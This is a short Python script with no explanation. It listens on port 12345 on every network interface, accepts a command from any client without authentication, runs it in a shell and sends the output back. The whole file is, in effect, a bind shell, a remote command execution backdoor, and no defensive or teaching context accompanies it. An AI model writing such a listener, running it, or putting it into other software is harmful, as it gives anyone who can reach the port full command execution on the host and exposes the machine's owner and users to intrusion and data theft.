import socket
import subprocess

def main():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('0.0.0.0', 12345))
    server_socket.listen(1)
    print("Server is listening on port 12345")
    while True:
        client_socket, client_address = server_socket.accept()
        print(f"Connection from {client_address} has been established.")
        command = client_socket.recv(1024).decode()
        if command.lower() == 'exit':
            break
        try:
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        except subprocess.CalledProcessError as e:
            output = e.output
        client_socket.send(output)
        client_socket.close()
    server_socket.close()

if __name__ == "__main__":
    main()
